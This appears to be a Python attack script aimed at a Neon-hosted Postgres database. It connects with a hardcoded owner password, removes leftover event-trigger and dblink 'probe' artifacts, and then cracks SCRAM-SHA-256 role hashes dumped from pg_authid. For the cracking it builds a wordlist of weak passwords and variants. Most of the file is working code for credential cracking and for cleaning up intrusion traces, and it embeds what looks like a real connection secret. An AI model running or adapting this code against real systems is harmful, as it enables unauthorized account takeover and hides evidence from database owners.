# -*- coding: utf-8 -*-
"""清理事件触发器探测残留(neondb)+ 离线 SCRAM 弱密码字典测试
SCRAM 验证: PBKDF2-SHA256(密码, salt, 4096) -> HMAC(salted, 'Client Key') -> SHA256 = storedkey"""
import psycopg, json, hashlib, hmac, base64

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql):
    try:
        cur.execute(sql)
        try:
            return cur.fetchall()
        except Exception:
            return 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:200]

print('=== [1] 清理探测残留 ===')
print('drop trigger:', q('DROP EVENT TRIGGER IF EXISTS k_evt_probe_trg'))
print('drop fn:', q('DROP FUNCTION IF EXISTS public.k_evt_probe()'))
print('drop log table:', q('DROP TABLE IF EXISTS public.k_evt_log'))
print('drop dblink:', q('DROP EXTENSION IF EXISTS dblink'))
print('final evt trgs:', q('SELECT evtname FROM pg_event_trigger'))
print('final ext:', q("SELECT extname FROM pg_extension"))

# ================= SCRAM 离线字典 =================
print('\n=== [2] SCRAM 弱密码字典(纯本地计算) ===')
dump = json.load(open(r'D:\scan\neon_report\_pg_authid_dump.json'))

def verify_scram(secret, stored):
    # SCRAM-SHA-256$<iter>:<salt_b64>$<storedkey_b64>:<serverkey_b64>
    try:
        parts = stored.split('$')
        algo, rest = parts[0], parts[1]
        iters_salt, keys = rest.split('$')
        iters, salt_b64 = iters_salt.split(':')
        storedkey_b64 = keys.split(':')[0]
        iters = int(iters)
        salt = base64.b64decode(salt_b64)
        salted = hashlib.pbkdf2_hmac('sha256', secret.encode(), salt, iters)
        client_key = hmac.new(salted, b'Client Key', hashlib.sha256).digest()
        storedkey = hashlib.sha256(client_key).digest()
        return hmac.compare_digest(storedkey, base64.b64decode(storedkey_b64))
    except Exception:
        return False

def variants(base):
    """基于 seed 生成密码变体"""
    out = set()
    for s in base:
        out.add(s)
        out.add(s.lower())
        out.add(s.capitalize())
        out.add(s.upper())
        for suf in ('123', '1234', '12345', '!', '1', '2024', '2025', '2026', '_admin', 'admin'):
            out.add(s + suf)
    return out

dict_words = [
    'password', 'secret', 'neon', 'neon123', 'postgres', 'admin', 'administrator',
    'changeme', 'default', 'letmein', 'welcome', 'qwerty', '123456', '12345678',
    'root', 'toor', 'test', 'testing', 'guest', 'temp', 'temporary', 'service',
    'auth', 'authenticator', 'neon_auth', 'neon_service', 'neondb', 'neondb_owner',
    'pg', 'pg123', 'postgres123', 'dev', 'dev123', 'staging', 'stage',
    'superuser', 'cloud_admin', 'cloudadmin', 'neonadmin', 'neonadmin123',
]
cands = set(dict_words)
for seed in list(dict_words):
    cands |= variants([seed])
# 组合 base
cands |= {'neon_%s' % w for w in dict_words}
cands |= {'%s_neon' % w for w in dict_words}
print('total candidates:', len(cands))

hits = {}
for role, stored in dump.items():
    found = None
    for c in cands:
        if verify_scram(c, stored):
            found = c
            break
    hits[role] = found
    print('  %s: %s' % (role, 'HIT=%r' % found if found else 'no hit'))

conn.close()
print('\n=== done ===')
